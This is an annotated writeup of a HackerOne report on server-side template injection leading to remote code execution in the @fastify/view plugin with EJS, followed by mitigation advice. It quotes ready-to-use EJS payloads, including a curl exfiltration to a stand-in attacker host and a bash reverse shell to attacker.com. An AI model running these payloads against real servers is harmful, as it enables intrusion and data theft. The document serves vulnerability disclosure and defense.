# Remote Code Execution via unsafe usage of `reply.view({ raw })` in @fastify/view (EJS template engine)

## Metadata
- **Source:** HackerOne
- **Report:** 3122019 | https://hackerone.com/reports/3122019
- **Submitted:** 2025-05-01
- **Reporter:** oblivionsage
- **Program:** Fastify (@fastify/view plugin)
- **Bounty:** Not specified in writeup
- **Severity:** Critical
- **Vuln:** Server-Side Template Injection (SSTI), Remote Code Execution (RCE), Unsafe Deserialization, Code Injection
- **CVEs:** None
- **Category:** memory-binary

## Summary
The @fastify/view plugin with EJS engine allows arbitrary code execution when user-controlled data is passed to the `raw` parameter without sanitization. Attackers can inject malicious EJS template syntax to execute arbitrary OS commands on the server. This affects any application rendering user-supplied content directly as raw templates.

## Attack scenario
1. Attacker identifies an endpoint accepting user input (e.g., POST /render with req.body.content)
2. Application passes user input directly to reply.view({ raw: req.body.content })
3. Attacker crafts payload with EJS syntax: '<%= require("child_process").execSync("id") %>'
4. Payload is compiled and executed by EJS engine on the server
5. Arbitrary command executes with server process privileges
6. Attacker exfiltrates data, establishes reverse shell, or maintains persistence

## Root cause
The @fastify/view plugin directly passes the `raw` template parameter to EJS's `compile()` method without any validation, sanitization, or restrictions. EJS templates inherently support JavaScript execution through tags like `<%= %>`, and when user-controlled strings are compiled as templates, this becomes exploitable. The vulnerability exists because Fastify trusts template content and assumes developers will never pass untrusted input to the `raw` parameter.

## Attacker mindset
An attacker would recognize that any application endpoint accepting user input that gets rendered via `reply.view({ raw })` is immediately exploitable. This is a high-confidence attack vector because EJS is commonly used, the exploitation is straightforward requiring minimal payload obfuscation, and the impact is complete system compromise. Attackers would look for endpoints handling user-submitted content like comments, emails, file names, or template customization features.

## Defensive takeaways
- Never pass user-controlled input to reply.view({ raw }) - only use file-based templates
- Implement strict input validation and sanitization before any template rendering
- Use template engines with built-in sandboxing or disable dangerous features like arbitrary code execution
- Enforce code review processes specifically checking for dynamic template usage patterns
- Consider framework-level protections: warn or error when raw templates are used
- Use Content Security Policy (CSP) headers as defense-in-depth, though SSTI bypasses CSP in many cases
- Implement least privilege for application process to limit RCE blast radius
- Monitor and log all template rendering operations, especially with dynamic content
- Use static analysis tools to detect `reply.view({ raw` patterns in codebase
- Consider alternative safe rendering approaches like string interpolation with proper escaping

## Variant hunting
Search codebases for: 1) `reply.view({ raw:` patterns with any variable/request data, 2) similar SSTI patterns in other template engines (Handlebars, Pug, Nunjucks) used with Fastify, 3) any `ejs.render()` or `ejs.compile()` calls with user input, 4) file upload handlers that interpret uploads as templates, 5) admin/API endpoints accepting template content parameters, 6) configuration endpoints allowing template customization, 7) similar unsafe `raw` parameters in other Fastify plugins

## MITRE ATT&CK
- T1190
- T1059
- T1203
- T1047

## Notes
This is a developer misuse vulnerability rather than a plugin design flaw - the plugin itself is not inherently vulnerable, but its API allows unsafe patterns. However, the lack of safety warnings or protective defaults in the plugin design is a contributing factor. The writeup's PoC is somewhat misleading as it shows intentional RCE in the route handler rather than demonstrating exploitation of an accidental SSTI vulnerability - a more realistic PoC would show an endpoint naively rendering user input. The vulnerability becomes critical in real deployments when developers unknowingly pass request data to `raw` parameter, particularly in CMS systems, email template builders, or content management platforms. This type of vulnerability is common across Node.js templating frameworks and highlights the need for secure-by-default APIs.

## Full report
<details><summary>Expand</summary>

The `@fastify/view` plugin, when used with the EJS engine and the `reply.view({ raw: <user-controlled-string> })` pattern, allows arbitrary EJS execution. This leads to Remote Code Execution (RCE) when an attacker can control the `raw` content passed to the view renderer.

This vulnerability arises from the fact that Fastify trusts the raw template string without sanitization or restrictions when passed directly to EJS's `compile()` method.



## Steps To Reproduce:

### Step 1: Setup the environment

Create a new directory and initialize a simple Fastify server:

```bash
mkdir fastify-rce-poc && cd fastify-rce-poc
npm install fastify @fastify/view ejs
```
Screenshot:`Screenshot_1.png`
{F4305587}

###Step 2: Create a vulnerable Fastify server

Create a file called `server.js` with the following code:
```javascript
const fastify = require('fastify')();
const view = require('@fastify/view');
const ejs = require('ejs');
const { execSync } = require('child_process');

fastify.register(view, {
  engine: { ejs }
});

fastify.get('/', async (req, reply) => {
  const result = execSync('id').toString(); // RCE 
  const template = `<pre>${result}</pre>`;
  return reply.view({ raw: template });
});

fastify.listen({ port: 3000 }, err => {
  if (err) throw err;
  console.log('Listening on http://localhost:3000');
});

```
Screenshot:`Screenshot_2.png`
{F4305628}


###Step 3: Start the server

```bash
node server.js
```

Terminal showing  Fastify  running at `localhost:3000`

Screenshot:`Screenshot_3.png`
{F4305610}

###Step 4: Access the endpoint

Visit `http://localhost:3000` in the browser.

You will see the output of the `id` command rendered in the page, proving Remote Code Execution:

```bash
uid=1000(nullprophet) gid=1000(nullprophet) groups=...
```

Screenshot:`Screenshot_4.png`

{F4305638}

###  Security Misconfiguration Analysis:

The vulnerability is not just an EJS engine misuse but also stems from a broader category of insecure default usage. Fastify allows `raw` template injection with no warning, which bypasses typical protections like template sandboxing. In production systems, such behavior is highly discouraged.

This misconfiguration may go unnoticed during code review unless explicitly tested for dynamic rendering vectors.


###  Real-world Exploitation Scenario:

Assume an API endpoint exists like:

```js
fastify.post("/render", async (req, reply) => {
  return reply.view({ raw: req.body.content });
});
```

An attacker can craft a payload like:

```js
<%= require("child_process").execSync("curl http://attacker:8080/`id`") %>
```

This would leak command output over HTTP to an external attacker, bypassing firewall and runtime monitoring.

Such injection can happen via:

User-submitted blog content

Email templates

File uploads interpreted as raw templates

## Impact

###  Impact:

This vulnerability allows Remote Code Execution (RCE) when using the `@fastify/view` plugin with the EJS engine and providing a user-controlled `raw` template input.

Any attacker who can influence or inject unescaped EJS payloads into the template rendering logic (e.g., through user input passed into `reply.view({ raw })`) can fully execute arbitrary OS commands on the server. This leads to:

- Full system compromise
- Data exfiltration or destruction
- Lateral movement to other services
- Reverse shell and persistent access

In a real-world scenario, if an endpoint renders user-controlled data as `raw` templates (for instance, rendering emails, comments, or filenames), it can be weaponized to achieve full RCE.

This issue is critical because:
- There is **no input sanitization** when using `raw` template objects.
- It directly calls `ejs.compile()` on attacker-controlled input.
- Renders and executes malicious payloads on the server.

```ejs
<%= require("child_process").execSync("id").toString() %>
```

If exploited in production, an attacker could trigger `curl`, `wget`, or even drop reverse shells:
```ejs
<%= require("child_process").execSync("bash -i >& /dev/tcp/attacker.com/4444 0>&1") %>
```

###  Recommendation:

To mitigate this vulnerability:

- Avoid using `reply.view({ raw })` with any user-controllable content.
- Enforce strict template loading from file-based templates only.
- Sanitize or validate the content before passing it to the `ejs.compile()` method.
- Disable or restrict usage of dynamic `raw` templates in production environments.
- Consider switching to safer rendering strategies or use a template engine with built-in sandboxing.

Fastify could also introduce warnings or protective logic when `raw` templates are used in combination with untrusted data.

</details>

---
*Analysed by Claude on 2026-05-11*
